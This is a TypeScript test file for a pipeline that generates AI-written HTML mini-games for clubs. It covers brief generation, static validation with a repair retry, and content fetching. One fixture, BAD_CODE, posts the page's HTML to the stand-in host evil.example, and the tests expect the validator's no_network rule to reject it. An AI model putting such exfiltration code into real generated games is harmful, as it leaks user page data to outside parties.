/**
 * Game generation pipeline tests (Workstream B).
 *
 * Flow under test: creator prompt → structured brief (step 1) → free code
 * generation from the brief (step 2) → static validation → at most one
 * repair retry with the violations fed back. Offline (mock client) the
 * pipeline is deterministic: keyword brief + the platform sample game,
 * which must itself pass validation.
 */
import { AI_MINIGAME_RUNTIME, AI_STAFF_ENABLED } from '@/lib/ai/flags';
import type { CostDb, CostDeps } from '@/lib/ai/cost';
import { MockAIClient } from '@/lib/ai/mock-client';
import type { AIClient } from '@/lib/ai/types';
import { buildDeterministicBrief, generateGame } from '@/lib/games/generate';
import { validateGameCode } from '@/lib/games/validate';
import { validBrief } from './validate.test';

let savedEnv: NodeJS.ProcessEnv;
beforeEach(() => {
    savedEnv = { ...process.env };
    process.env[AI_STAFF_ENABLED] = '1';
    process.env[AI_MINIGAME_RUNTIME] = '1';
});
afterEach(() => {
    process.env = savedEnv;
});

function costDeps(): CostDeps {
    const db: CostDb = {
        async getBudget() {
            return null;
        },
        async createBudget() {},
        async updateBudget() {},
        async insertUsage() {},
        async listUsage() {
            return [];
        },
    };
    return { db };
}

const GOOD_CODE =
    '<!DOCTYPE html><html><head><title>Quiz</title></head><body><script>ClubGame.submitScore(100);</script></body></html>';
const BAD_CODE =
    '<!DOCTYPE html><html><body><script>fetch("https://evil.example", { method: "POST", body: document.body.innerHTML });</script></body></html>';

/** Stub model: answers brief requests with a valid brief, code requests from a queue. */
function stubClient(codeQueue: string[]) {
    const queue = [...codeQueue];
    const seenPayloads: Array<Record<string, unknown>> = [];
    const client: AIClient = {
        mock: false,
        async chat(req) {
            const userMsg = req.messages[req.messages.length - 1];
            const parsed = JSON.parse(userMsg.content) as {
                signal?: string;
                payload?: Record<string, unknown>;
            };
            seenPayloads.push(parsed.payload ?? {});
            if (parsed.signal === 'game_brief') {
                return {
                    content: JSON.stringify(validBrief()),
                    usage: { promptTokens: 10, completionTokens: 10 },
                };
            }
            const html = queue.shift() ?? GOOD_CODE;
            return {
                content: JSON.stringify({ html }),
                usage: { promptTokens: 10, completionTokens: 10 },
            };
        },
    };
    return { client, seenPayloads };
}

describe('generateGame (AI path)', () => {
    it('prompt -> brief -> code -> validated game in one attempt', async () => {
        const { client, seenPayloads } = stubClient([GOOD_CODE]);
        const out = await generateGame(
            { clubId: 'club-1', prompt: 'Un quiz de preguntas del club', createdBy: 'user-1' },
            { client, cost: costDeps() },
        );
        expect(out.mock).toBe(false);
        expect(out.attempts).toBe(1);
        expect(out.validation.ok).toBe(true);
        expect(out.brief.title).toBe(validBrief().title);
        expect(out.html).toContain('ClubGame.submitScore');
        // The code step received the BRIEF (not the raw prompt) as its spec.
        const codePayload = seenPayloads[1] as { brief?: { title?: string } };
        expect(codePayload.brief?.title).toBe(validBrief().title);
    });

    it('repairs once when the first code attempt fails validation', async () => {
        const { client, seenPayloads } = stubClient([BAD_CODE, GOOD_CODE]);
        const out = await generateGame(
            { clubId: 'club-1', prompt: 'Un quiz', createdBy: 'user-1' },
            { client, cost: costDeps() },
        );
        expect(out.attempts).toBe(2);
        expect(out.validation.ok).toBe(true);
        // The repair request carried the violations back to the model.
        const repairPayload = seenPayloads[2] as { repairErrors?: string[] };
        expect(repairPayload.repairErrors?.join(' ')).toMatch(/no_network/);
    });

    it('gives up after the attempt budget and reports the violations (no throw)', async () => {
        const { client } = stubClient([BAD_CODE, BAD_CODE]);
        const out = await generateGame(
            { clubId: 'club-1', prompt: 'Un quiz', createdBy: 'user-1' },
            { client, cost: costDeps() },
        );
        expect(out.attempts).toBe(2);
        expect(out.validation.ok).toBe(false);
        expect(out.validation.violations.some((v) => v.rule === 'no_network')).toBe(true);
    });

    it('content-born games: declared content is fetched and reaches the code step', async () => {
        const { client, seenPayloads } = stubClient([GOOD_CODE]);
        const fetched: unknown[] = [];
        const out = await generateGame(
            { clubId: 'club-1', prompt: 'Quiz del último post', createdBy: 'user-1' },
            {
                client,
                cost: costDeps(),
                content: {
                    async fetchContent(clubId, source) {
                        fetched.push({ clubId, source });
                        return 'CONTENIDO DEL POST: El club cumple 5 años.';
                    },
                },
            },
        );
        expect(out.validation.ok).toBe(true);
        expect(fetched).toHaveLength(1);
        const codePayload = seenPayloads[1] as { contentText?: string };
        expect(codePayload.contentText).toContain('CONTENIDO DEL POST');
    });

    it('rejects a brief that uses content without declaring content.read', async () => {
        const briefNoRead = validBrief({ capabilities: ['leaderboard', 'outcomes'] });
        const client: AIClient = {
            mock: false,
            async chat(req) {
                const parsed = JSON.parse(
                    req.messages[req.messages.length - 1].content,
                ) as { signal?: string };
                if (parsed.signal === 'game_brief') {
                    return {
                        content: JSON.stringify(briefNoRead),
                        usage: { promptTokens: 1, completionTokens: 1 },
                    };
                }
                return {
                    content: JSON.stringify({ html: GOOD_CODE }),
                    usage: { promptTokens: 1, completionTokens: 1 },
                };
            },
        };
        await expect(
            generateGame(
                { clubId: 'club-1', prompt: 'Quiz del post', createdBy: 'user-1' },
                { client, cost: costDeps(), content: { async fetchContent() { return 'x'; } } },
            ),
        ).rejects.toThrow(/content\.read/);
    });
});

describe('generateGame (offline deterministic path)', () => {
    it('mock client -> deterministic brief + sample game that passes validation', async () => {
        const out = await generateGame(
            { clubId: 'club-1', prompt: 'Un juego de reflejos para el evento', createdBy: 'user-1' },
            { client: new MockAIClient(), cost: costDeps() },
        );
        expect(out.mock).toBe(true);
        expect(out.brief.gameType).toBe('reflejos');
        expect(out.validation.ok).toBe(true);
        expect(validateGameCode(out.html, out.brief).ok).toBe(true);
        // The sample is a real playable game, not a placeholder string.
        expect(out.html).toContain('ClubGame.submitScore');
        expect(out.html.length).toBeGreaterThan(800);
    });
});

describe('buildDeterministicBrief', () => {
    it('maps prompt keywords to game types and capabilities', () => {
        const quiz = buildDeterministicBrief('Quiero un quiz sobre mi último post');
        expect(quiz.gameType).toBe('quiz');
        expect(quiz.capabilities).toContain('content.read');
        expect(quiz.contentSource).toMatchObject({ type: 'recent_posts' });

        const memory = buildDeterministicBrief('Un juego de memoria con parejas');
        expect(memory.gameType).toBe('memoria');
        expect(memory.capabilities).toContain('game.state');

        const plain = buildDeterministicBrief('Algo divertido para el viernes');
        expect(plain.capabilities).not.toContain('content.read');
        expect(plain.maxScore).toBeLessThanOrEqual(100_000);
    });
});
